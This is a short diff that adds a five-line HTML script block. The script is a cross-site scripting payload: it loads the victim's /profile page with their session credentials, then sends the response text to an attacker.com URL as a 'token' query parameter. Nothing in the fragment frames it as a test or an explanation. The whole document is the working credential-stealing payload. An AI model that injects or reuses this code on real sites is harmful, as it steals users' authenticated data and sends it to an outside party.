@@ -1,0 +1,5 @@
+<script>
+fetch("/profile", {credentials:"include"})
+.then(r => r.text())
+.then(d => fetch("https://attacker.com?token="+d));
+</script>
